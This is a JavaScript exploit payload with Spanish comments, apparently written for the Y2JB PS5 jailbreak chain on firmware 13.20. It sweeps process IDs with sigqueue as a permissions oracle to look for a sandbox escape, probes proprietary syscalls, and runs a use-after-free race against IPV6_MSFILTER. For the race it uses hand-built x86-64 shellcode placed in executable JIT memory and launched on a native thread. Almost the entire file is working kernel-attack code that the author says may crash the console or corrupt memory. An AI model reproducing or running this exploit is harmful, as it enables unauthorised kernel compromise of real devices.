// reach_probe_1320_v4.js -- Y2JB payload: probe fase 4 (PS5 13.20)
// --------------------------------------------------------------------------------
// Sucesor de reach_probe_1320_v3.js. Tres bloques nuevos, NINGUNO repite
// superficie ya resuelta en v2/v3. Orden deliberado: B1 (sweep, seguro) ->
// B3 (propietarias, riesgo bajo) -> B2 (RACE UAF, AL FINAL: si paniquea,
// todo lo anterior ya esta logueado).
//
//   B1  sigqueue sweep pids 1..1023 con signum=0 (P11, CVE-2026-45259,
//       syscall 0x1c8=456, kstuff-13/freebsd-headers/sys/syscall.h:379).
//       signum 0 = oraculo puro de permisos: sys_sigqueue valida pid y llama
//       a p_cansignal SIN entregar señal (RESEARCH/fbsd2/src110/kern_sig.c
//       :1833-1870; verificado inofensivo en v3: ok sin efectos). Cada pid
//       que devuelve ok = señalable desde la jaula = candidato de escape.
//   B3  mini-extensiones propietarias con args reales (despues de B1, antes
//       del race): IOREQ 0x2cb sweep tipo t=0..7 (v3: t=1->EINVAL,
//       t=0->EFAULT), get_self_auth_info 0x25f en ambos ordenes de args,
//       PHYSHM_OPEN 0x275 con nombre real. Numeros: orbis-syscalls-playbook.
//   B2  RACE PoC IPV6_MSFILTER (P2, CVE-2026-49412). Unico payload con
//       concurrencia real: hilo nativo (thr_new + shellcode raw-syscall en
//       jitshm) martillea setsockopt(IPV6_MSFILTER) mientras el hilo JS
//       martillea JOIN_GROUP/LEAVE_GROUP en el MISMO socket.
//
//       VENTANA DE LOCK-DROP (VERIFICADA en esta revision, la cita que pide
//       el CVE): RESEARCH/fbsd2/src110/in6_mcast.c, in6p_set_source_filters:
//         :2442  INP_WUNLOCK(inp);                       <-- se SUELTA el inp
//         :2446-2447 kss = malloc(128*nsrcs, M_TEMP, M_WAITOK)  (puede dormir)
//         :2448-2449 error = copyin(msfr.msfr_srcs, kss, 128*nsrcs) <-- ventana
//         :2455  INP_WLOCK(inp);                         <-- RE-ADQUIERE
//       Durante [2442..2455] el inp esta desprotegido: un LEAVE_GROUP
//       concurrente (ip6_leavegroup libera im6o_membership/inm) puede
//       liberar el inm/im6o que MSFILTER re-dereferencia al re-adquirir el
//       lock (inm/imf se capturan en :2415-2421 ANTES del unlock y se usan
//       en :2462+ DESPUES del re-lock, sin re-validar) => UAF.
//
//       nsrcs: IPV6_MAX_SOCK_SRC_FILTER = 128 (RESEARCH/kstuff-13/
//       freebsd-headers/netinet6/in6.h:517; in6_mcast.c:165 inicializa
//       in6_mcast_maxsocksrc = IPV6_MAX_SOCK_SRC_FILTER y :2386 hace
//       nsrcs>max -> ENOBUFS ANTES de la ventana). 4096 EXCEDERIA el max y
//       mataria la llamada antes del lock-drop => usamos el max: nsrcs=128,
//       buffer de srcs = 128*128B = 16KB (copyin de 16KB en la ventana).
//
// Riesgos asumidos: B1 manda signum=0 (no entrega senal; verificado v3). B2
// es un UAF real: PUEDE paniquear/reiniciar la consola o corromper memoria
// sin panic silencioso. Por eso va AL FINAL y loguea aviso explicito antes
// de arrancar. B3 mismo riesgo que v3-B4 (ya tolerado: EPERM/EFAULT
// consistentes de Sony).
//
// Notas de codificacion: SYS_setsockopt=105=0x69 (syscall.h:112; el 118 es
// getsockopt, syscall.h:125 -- el enunciado decia 118, es errata, se usa
// 105 y coincide con SYSCALL.setsockopt=0x69 de global.js). PAGE_SIZE global
// en global.js = 0x4000 (paginas PS5), se alinea con el global como hace
// aioshellcode.js L26-45. MAP_SHARED=0x1 / MAP_PRIVATE=0x2 /
// MAP_ANONYMOUS=0x1000 (sys/mman.h:60-61,84; globales en global.js:74-77;
// stack flags = MAP_PRIVATE|MAP_ANONYMOUS = 0x1002). thr_param 0x68B:
// sys/thr.h (start_func@0, arg@8, stack_base@0x10, stack_size@0x18,
// tls_base@0x20, tls_size@0x28, child_tid@0x30, parent_tid@0x38, flags@0x40
// int+4pad, rtp@0x48, spare@0x50..0x67). SYS_thr_new=455=0x1c7
// (syscall.h:378), SYS_thr_exit=431=0x1af (syscall.h:355). Blob de shellcode
// (98B) verificado con objdump -D -b binary -m i386:x86-64 (je/jne->done,
// jmp->loop, cmp $0x186a0=100000, movabs para dirs >4GB).
//
// v4 (2026-08-27). Interfaz Y2JB: syscall(), SYSCALL, malloc, alloc_string,
// read8/16/32/64, write8/16/32/64, toHex, log, send_notification,
// get_error_string().

(async () => {
    const R = {};
    const ORDER = [];

    const rec = async (k, v) => {
        R[k] = v; ORDER.push(k);
        try { await log("[probe4] " + k + " = " + v); } catch (e) {}
    };

    const B = (x) => (typeof x === "bigint" ? x : BigInt(x));

    const sy = (num, ...args) => {
        try {
            const raw = syscall(B(num), ...args.map(B));
            const r = BigInt.asIntN(64, raw);
            if (r < 0n) return "ERR:" + get_error_string();
            return "ok:" + toHex(raw);
        } catch (e) { return "EX:" + e; }
    };

    const isOk = (v) => (v || "").startsWith("ok");
    // "ERR:<n> ..." -> numero de errno (get_error_string empieza por el num,
    // patron ya usado en v3: "ERR:78 ", "ERR:45 ")
    const errnoOf = (v) => {
        const m = /^ERR:(\d+)/.exec(v || "");
        return m ? parseInt(m[1], 10) : -1;
    };

    // constantes ABI (verificadas contra RESEARCH/ y global.js, ver cabecera)
    const SYS_SIGQUEUE   = 0x1c8n;  // 456, syscall.h:379 (no esta en SYSCALL)
    const IPPROTO_IPV6   = 41n;     // in.h:177
    const IPV6_JOIN_GRP  = 12n, IPV6_LEAVE_GRP = 13n;    // in6.h:402-403
    const IPV6_MSFILTER  = 74n;     // in6.h:488
    const MSFR_SIZE      = 152n;    // sizeof(__msfilterreq) in.h:555 (0x98)
    const NSRCS          = 128;     // IPV6_MAX_SOCK_SRC_FILTER in6.h:517
    const SS_SIZE        = 128;     // sizeof(sockaddr_storage) para msfr_srcs
    const EPERM = 1, ESRCH = 3;     // errno FreeBSD 11

    // =====================================================================
    // B1 -- sigqueue sweep pids 1..1023 con signum=0 (P11, CVE-2026-45259)
    // Bucle 100% sincrono sin awaits (log de hits bufferizado y volcado al
    // salir del bucle). signum=0 = oraculo de permisos, no entrega senal.
    // =====================================================================
    let pid = 0n;
    try { pid = syscall(SYSCALL.getpid); } catch (e) {}
    await rec("B1:getpid", "ok:" + toHex(pid));

    try {
        const hits = [];            // pids que devuelven ok = senalables
        let nEPERM = 0, nESRCH = 0, nOtro = 0, nEx = 0;
        const otroSample = new Map(); // errno-str -> count (sample de errores)
        for (let p = 1; p <= 1023; p++) {
            let v;
            try {
                const raw = syscall(SYS_SIGQUEUE, B(p), 0n, 0n);
                const r = BigInt.asIntN(64, raw);
                v = (r < 0n) ? "ERR:" + get_error_string() : "ok:" + toHex(raw);
            } catch (e) { v = "EX:" + e; }
            if (isOk(v))            hits.push(p + v);
            else if (errnoOf(v) === EPERM) nEPERM++;
            else if (errnoOf(v) === ESRCH) nESRCH++;
            else if (v.startsWith("EX:"))  nEx++;
            else {
                nOtro++;
                const key = v.slice(0, 24);
                otroSample.set(key, (otroSample.get(key) || 0) + 1);
            }
        }
        // log INMEDIATO post-bucle de cada pid senalable (hits bufferizados
        // para no meter awaits dentro del bucle critico)
        for (const h of hits) {
            try { await log("[probe4] B1 HIT senalable: pid " + h); } catch (e) {}
        }
        await rec("B1:sweep:senalables", hits.length ? hits.join(",") : "(ninguno)");
        await rec("B1:sweep:EPERM(vivo-no-senalable)", nEPERM);
        await rec("B1:sweep:ESRCH(muerto)", nESRCH);
        await rec("B1:sweep:otro", nOtro + (otroSample.size
                  ? " sample=[" + [...otroSample.entries()].map(([k, c]) => k + "x" + c).join("; ") + "]"
                  : ""));
        await rec("B1:sweep:EX", nEx);
        await log("[probe4] B1 veredicto: pids senalables " + hits.length +
                  " (uid propio=" + toHex(pid) + " el nuestro); si algun pid senalable" +
                  " esta fuera de nuestra jaula -> P11 escape demostrable" +
                  (hits.length ? " [REVISAR LISTA]" : " [sweep limpio]"));
    } catch (e) { await rec("B1:sweep", "EX:" + e); }

    // =====================================================================
    // B3 -- mini-extensiones propietarias (antes del race: si el race
    // panquea, esto ya esta medido).
    // =====================================================================
    await log("[probe4] === B3 propietarias (riesgo bajo, mismos patrones que v3-B4) ===");

    // IOREQ (0x2cb): sweep de tipo t=0..7 con (t, buf, 0x100).
    // (v3: t=0->EFAULT, t=1->EINVAL: el handler desreferencia y valida tipo)
    try {
        const b1 = malloc(0x100);
        for (let t = 0; t < 8; t++)
            await rec("B3:IOREQ(t=" + t + ")", sy(0x2cb, t, b1, 0x100));
    } catch (e) { await rec("B3:IOREQ", "EX:" + e); }

    // get_self_auth_info (0x25f): ambos ordenes de args; si ok, dump 0x100.
    try {
        const buf = malloc(0x100);
        const stA = sy(0x25f, pid, buf);
        await rec("B3:get_self_auth_info(pid,buf)", stA);
        const stB = sy(0x25f, buf, pid);
        await rec("B3:get_self_auth_info(buf,pid)", stB);
        if (isOk(stA) || isOk(stB)) {
            let dump = "";
            for (let i = 0; i < 0x100; i += 8)
                dump += toHex(read64(buf + BigInt(i))) + " ";
            await rec("B3:self_auth_info_dump", dump);
        }
    } catch (e) { await rec("B3:get_self_auth_info", "EX:" + e); }

    // PHYSHM_OPEN (0x275): (name="phys0", buf, 0) -- 1 llamada.
    try {
        const name = alloc_string("phys0");
        const outp = malloc(0x100);
        await rec("B3:PHYSHM_OPEN(phys0,buf,0)", sy(0x275, name, outp, 0));
    } catch (e) { await rec("B3:PHYSHM_OPEN", "EX:" + e); }

    // =====================================================================
    // B2 -- RACE PoC IPV6_MSFILTER (P2, CVE-2026-49412). AL FINAL.
    // Hilo nativo (thr_new): bucle setsockopt(fd,41,74,msfr,152) raw-syscall.
    // Hilo JS: bucle JOIN_GROUP/LEAVE_GROUP sobre el MISMO socket.
    // Ventana: INP_WUNLOCK..INP_WLOCK alrededor del malloc+copyin de la
    // source list (in6_mcast.c:2442-2455). Riesgo: panic/crash = confirmacion.
    // =====================================================================
    await log("[probe4] === B2 RACE P2 ARRANCANDO: si la consola se reinicia en los proximos segundos, el UAF (CVE-2026-49412) esta CONFIRMADO ===");

    let raceSock = -1n, sanitySock = -1n;
    let jsIters = 0, doneflagVal = -1, stackAddr = 0n;
    try {
        // ---- socket de race (el del v3 esta cerrado; creamos uno nuevo) ----
        const rawS = syscall(SYSCALL.socket, 28n, 2n, 0n); // AF_INET6, DGRAM
        raceSock = BigInt.asIntN(64, rawS);
        await rec("B2:socket:INET6", raceSock < 0n ? "ERR:" + get_error_string() : "ok fd=" + rawS);

        if (raceSock >= 0n) {
            // ---- JOIN inicial ff02::1/ifindex 1 (mreq 20B, verificado ok v3) ----
            const mreq = malloc(20);
            write64(mreq + 0n, 0x2ffn);                  // ff02::
            write64(mreq + 8n, 0x0100000000000000n);     // ::1
            write32(mreq + 16n, 1);                      // ipv6mr_interface
            await rec("B2:JOIN(pre-race)",
                      sy(SYSCALL.setsockopt, raceSock, IPPROTO_IPV6, IPV6_JOIN_GRP, mreq, 20));

            // ---- msfr (152B) nsrcs=128, srcs -> buffer 128*128B ----
            const ssf = (addr, b0, b15) => {
                // sockaddr_in6: len@0=28, fam@1=28, port@2=0, flow@4=0,
                // addr@8 (16B), scope@24=0 (in6.h:123)
                write8(addr + 0n, 28); write8(addr + 1n, 28);
                write16(addr + 2n, 0); write32(addr + 4n, 0);
                write64(addr + 8n, b0); write64(addr + 16n, b15);
                write32(addr + 24n, 0);
            };
            const srcs = malloc(NSRCS * SS_SIZE);          // 16KB
            for (let i = 0; i < NSRCS * SS_SIZE; i += 8) write64(srcs + BigInt(i), 0n);
            // SOLO la primera entrada (128B) valida (::1); el resto a cero:
            // familia 0 -> EAFNOSUPPORT POST-copyin (in6_mcast.c:2478) =>
            // la ventana de copyin de 16KB se ejecuta completa SIEMPRE.
            ssf(srcs + 0n, 0n, 0x0100000000000000n);       // ::1
            const msfr = malloc(Number(MSFR_SIZE));
            for (let i = 0; i < 0x98; i += 8) write64(msfr + BigInt(i), 0n);
            write32(msfr + 0n,   1);                       // msfr_ifindex = 1
            write32(msfr + 4n,   1);                       // msfr_fmode = MCAST_INCLUDE
            write32(msfr + 8n,   NSRCS);                   // msfr_nsrcs = 128 (= max)
            write32(msfr + 12n,  0);                       // padding
            ssf(msfr + 16n, 0x2ffn, 0x0100000000000000n);  // msfr_group ff02::1 @16
            write64(msfr + 144n, srcs);                    // msfr_srcs @144

            // ---- flags compartidos: stopflag@0, doneflag@4, child_tid@8 ----
            const flags = malloc(0x10);
            write32(flags + 0n, 0);   // stopflag: JS lo pone a 1 al terminar
            write32(flags + 4n, 0);   // doneflag: nativo lo pone a 1 al salir
            const childTid = flags + 8n;
            const stopAddr  = flags + 0n;
            const doneAddr  = flags + 4n;

            // ---- shellcode nativo (98B), builder verificado con objdump ----
            // (desassembly verificado: je/jne->done(0x48), jmp->loop(0x3),
            //  cmp $0x186a0(=100000), movabs p/ dirs>4GB, rax=105/431)
            const build_shellcode = (fd, msfrA, stopA, doneA, MAX_ITERS) => {
                const bytes = [];
                const emit32 = (v) => { let x = Number(BigInt.asUintN(32, BigInt(v)));
                    bytes.push(x & 0xff, (x >>> 8) & 0xff, (x >> 16) & 0xff, (x >>> 24) & 0xff); };
                const emit64 = (v) => { let x = BigInt(v);
                    for (let i = 0n; i < 8n; i++) bytes.push(Number((x >> (i * 8n)) & 0xffn)); };
                const emit = (...b) => bytes.push(...b);
                emit(0x49, 0x31, 0xC9);                       // xor r9,r9 (iter)
                const loop = bytes.length;                    // 0x03
                emit(0xB8); emit32(105);                      // mov eax,105 setsockopt
                emit(0xBF); emit32(fd);                       // mov edi,fd
                emit(0xBE); emit32(41);                       // mov esi,IPPROTO_IPV6
                emit(0xBA); emit32(74);                       // mov edx,IPV6_MSFILTER
                emit(0x49, 0xBA); emit64(msfrA);              // movabs r10,msfr
                emit(0x41, 0xB8); emit32(152);                // mov r8d,152
                emit(0x0F, 0x05);                             // syscall
                emit(0x49, 0xFF, 0xC1);                       // inc r9
                emit(0x49, 0x81, 0xF9); emit32(MAX_ITERS);    // cmp r9,100000
                emit(0x74); bytes.push(0); const jeAt = bytes.length - 1;
                emit(0x49, 0xBB); emit64(stopA);              // movabs r11,stopflag
                emit(0x41, 0x8B, 0x03);                       // mov eax,[r11]
                emit(0x85, 0xC0);                             // test eax,eax
                emit(0x75); bytes.push(0); const jnzAt = bytes.length - 1;
                emit(0xEB); bytes.push(0); const jmpAt = bytes.length - 1;
                const done = bytes.length;
                emit(0x49, 0xBB); emit64(doneA);              // movabs r11,doneflag
                emit(0x41, 0xC7, 0x03); emit32(1);            // mov dword [r11],1
                emit(0x31, 0xFF);                             // xor edi,edi
                emit(0xB8); emit32(431);                      // mov eax,431 thr_exit
                emit(0x0F, 0x05);                             // syscall
                bytes[jeAt]  = (done - (jeAt  + 1)) & 0xff;   // je  done
                bytes[jnzAt] = (done - (jnzAt + 1)) & 0xff;   // jne done
                bytes[jmpAt] = (loop - (jmpAt + 1)) & 0xff;   // jmp loop
                return bytes;
            };
            const MAX_ITERS = 100000;
            const sc = build_shellcode(Number(raceSock), msfr, stopAddr, doneAddr, MAX_ITERS);
            await rec("B2:shellcode:len", sc.length + "B hex=" +
                      sc.map(x => x.toString(16).padStart(2, "0")).join(""));

            // ---- mapeo ejecutable via jitshm (replica aioshellcode.js L26-45) ----
            const scSize = B(sc.length);
            const ps = B(PAGE_SIZE);                    // global.js: 0x4000 (PS5)
            const aligned = (scSize + ps - 1n) & ~(ps - 1n);
            const jfdRaw = syscall(SYSCALL.jitshm_create, 0n, aligned, 0x7n);
            const jfd = BigInt.asIntN(64, jfdRaw);
            await rec("B2:jitshm_create", jfd < 0n ? "ERR:" + get_error_string() : "ok fd=" + toHex(jfdRaw));
            let execAddr = 0n;
            if (jfd >= 0n) {
                const mRaw = syscall(SYSCALL.mmap, 0n, aligned, 0x7n, MAP_SHARED, jfd, 0n);
                execAddr = BigInt.asIntN(64, mRaw);
                await rec("B2:mmap:exec", execAddr <= 0n ? "ERR:" + get_error_string() : "ok " + toHex(mRaw));
            }
            if (execAddr > 0n) {
                for (let i = 0; i < sc.length; i++) write8(execAddr + BigInt(i), sc[i]);

                // ---- stack del hilo: mmap(RW, PRIVATE|ANON) ----
                const stkRaw = syscall(SYSCALL.mmap, 0n, 0x20000n, 0x3n,
                                       MAP_PRIVATE | MAP_ANONYMOUS, B(-1), 0n);
                stackAddr = BigInt.asIntN(64, stkRaw);
                await rec("B2:mmap:stack", stackAddr <= 0n ? "ERR:" + get_error_string() : "ok " + toHex(stkRaw));

                if (stackAddr > 0n) {
                    // ---- thr_param (0x68B, sys/thr.h) ----
                    const tp = malloc(0x68);
                    for (let i = 0; i < 0x68; i += 8) write64(tp + BigInt(i), 0n);
                    write64(tp + 0x00n, execAddr);            // start_func
                    write64(tp + 0x08n, 0n);                  // arg
                    write64(tp + 0x10n, stackAddr);           // stack_base (base baja; rsp inicial = base+size via cpu_set_upcall, kern_thr.c:163-166)
                    write64(tp + 0x18n, 0x20000n);            // stack_size
                    write64(tp + 0x20n, 0n);                  // tls_base
                    write64(tp + 0x28n, 0n);                  // tls_size
                    write64(tp + 0x30n, childTid);            // child_tid (poll)
                    write64(tp + 0x38n, 0n);                  // parent_tid
                    write32(tp + 0x40n, 0);                   // flags
                    write64(tp + 0x48n, 0n);                  // rtp
                    write64(tp + 0x50n, 0n);                  // spare[0..2]
                    write64(tp + 0x58n, 0n);
                    write64(tp + 0x60n, 0n);
                    const tRaw = syscall(SYSCALL.thr_new, tp, B(0x68));
                    const tRet = BigInt.asIntN(64, tRaw);
                    await rec("B2:thr_new", tRet < 0n ? "ERR:" + get_error_string()
                                                      : "ok tid=" + toHex(read64(childTid)));

                    if (tRet >= 0n) {
                        // ---- hilo JS concurrente: bucle SIN awaits ni logs ----
                        // JOIN/LEAVE no bloquean (setsockopt de multicast);
                        // el nativo corre en paralelo en otro core.
                        for (jsIters = 0; jsIters < 200000; jsIters++) {
                            syscall(SYSCALL.setsockopt, raceSock, IPPROTO_IPV6, IPV6_JOIN_GRP, mreq, 20);
                            syscall(SYSCALL.setsockopt, raceSock, IPPROTO_IPV6, IPV6_LEAVE_GRP, mreq, 20);
                            if ((jsIters & 0xFFF) === 0 && Number(read32(doneAddr)) !== 0) break;
                        }
                        write32(stopAddr, 1);   // pide al nativo que pare
                        await rec("B2:js-loop:iters", jsIters * 2 + " setsockopt JOIN/LEAVE");

                        // ---- poll doneflag con sched_yield, ~15s max ----
                        // (100k yields x ~0.1ms = orden de 10-15s; acotado)
                        for (let p = 0; p < 100000; p++) {
                            doneflagVal = Number(read32(doneAddr));
                            if (doneflagVal !== 0) break;
                            syscall(SYSCALL.sched_yield);
                        }
                        await rec("B2:doneflag", doneflagVal +
                                  (doneflagVal === 0 ? " (TIMEOUT: hilo nativo no acabo)" : " (hilo nativo salio limpio)"));
                    }
                }
            }
        }
    } catch (e) { await rec("B2:race", "EX:" + e); }

    // ---- sanity-checks post-race: si esto loguea, la consola SIGUE VIVA ----
    try {
        const gp = syscall(SYSCALL.getpid);
        await rec("B2:sanity:getpid", "ok:" + toHex(gp));
        const rawS2 = syscall(SYSCALL.socket, 28n, 2n, 0n);
        sanitySock = BigInt.asIntN(64, rawS2);
        await rec("B2:sanity:socket", sanitySock < 0n ? "ERR:" + get_error_string() : "ok fd=" + rawS2);
        if (sanitySock >= 0n) {
            const mreq2 = malloc(20);
            write64(mreq2 + 0n, 0x2ffn);
            write64(mreq2 + 8n, 0x0100000000000000n);
            write32(mreq2 + 16n, 1);
            await rec("B2:sanity:JOIN(socket nuevo)",
                      sy(SYSCALL.setsockopt, sanitySock, IPPROTO_IPV6, IPV6_JOIN_GRP, mreq2, 20));
            await log("[probe4] B2 veredicto: CONSOLA VIVA tras race (getpid+socket+JOIN ok) " +
                      "-> UAF no disparado en esta corrida (ventana no ganada)");
        } else {
            await log("[probe4] B2 veredicto: socket post-race FALLO: estado del kernel sospechoso");
        }
    } catch (e) { await rec("B2:sanity", "EX:" + e); }

    // ---- limpieza ----
    try {
        if (raceSock   >= 0n) syscall(SYSCALL.close, raceSock);
        if (sanitySock >= 0n) syscall(SYSCALL.close, sanitySock);
        if (stackAddr  >  0n) syscall(SYSCALL.munmap, stackAddr, 0x20000n);
    } catch (e) {}
    await log("[probe4] === RACE completado sin panic: " + (jsIters * 2) +
              " iters JOIN/LEAVE, MSFILTER<=100000 (no observable desde JS), doneflag=" +
              doneflagVal + " ===");

    // =====================================================================
    // Resumen clasificado por bloque
    // =====================================================================
    const grp  = (re) => ORDER.filter(k => re.test(k));
    const list = (ks) => ks.map(k => k.split(":").slice(-1)[0] + "=" + R[k]).join(" | ");

    await log("[probe4] ===== RESULTADO v4 =====");
    await log("[probe4] B1 sigqueue sweep: " + list(grp(/^B1:sweep/)));
    await log("[probe4] B1 senalables: " + (R["B1:sweep:senalables"] || "?"));
    await log("[probe4] B3 propietarias: " + list(grp(/^B3:/).filter(k => !/dump/.test(k))));
    await log("[probe4] B3 dump auth_info: " + (R["B3:self_auth_info_dump"] || "(no ok)"));
    await log("[probe4] B2 race: " + list(grp(/^B2:/)));
    await log("[probe4] leyenda: ERR:<n>=errno FreeBSD (1=EPERM 3=ESRCH 78=ENOSYS) | ok=llamable");
    try { send_notification("[probe v4] done"); } catch (e) {}
})();
